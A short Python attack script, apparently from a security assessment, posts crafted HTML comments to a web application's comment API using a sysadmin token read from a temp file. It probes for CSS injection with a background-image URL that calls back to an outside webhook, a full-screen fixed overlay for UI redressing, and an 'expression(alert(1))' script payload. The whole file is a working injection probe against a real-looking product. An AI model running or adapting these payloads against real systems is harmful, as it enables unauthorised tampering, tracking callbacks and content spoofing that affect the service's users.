import json,subprocess,os,uuid
H=os.environ['H']; BB=os.environ['BB']; WH=os.environ['WH']
TOK=open('/tmp/bac_SYSADMIN').read().strip()
def post(html):
    body={"comment":{"type":"Comment","commentable_type":"ExceptionRequest",
                     "commentable_id":33,"message_raw":html,"message_html":html}}
    cmd=['curl','-s','-m','30','-o','/tmp/b','-w','%{http_code}','-X','POST',H+'/api/v1/comments',
         '-H','token: '+TOK,'-H',BB,'-H','Content-Type: application/json',
         '-H','X-Auditboard-Product: System','-d',json.dumps(body)]
    c=subprocess.run(cmd,capture_output=True,text=True).stdout.strip()
    return c, open('/tmp/b',encoding='utf-8',errors='replace').read()
tag='ZXC'+uuid.uuid4().hex[:5]
print("=== CSS injection: does style survive with a real payload? ===")
probes=[
 ('bg-url',     f'<div style="background-image:url({WH}/{tag}-css.png);width:300px;height:100px">ZX{tag}</div>'),
 ('pos-fixed',  f'<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:red;z-index:99999">ZX{tag}</div>'),
 ('font-face',  f'<span style="font-family:x">ZX{tag}</span>'),
 ('expr',       f'<div style="width:expression(alert(1))">ZX{tag}</div>'),
]
for label,h in probes:
    c,b=post(h)
    st=''
    if c in ('200','201'):
        try:
            o=json.loads(b)['comments'][0]
            st=f"id={o['id']} html={o.get('message_html')!r}"
        except: pass
    print(f"  {label:12} {c:>4}  {st[:130]}")
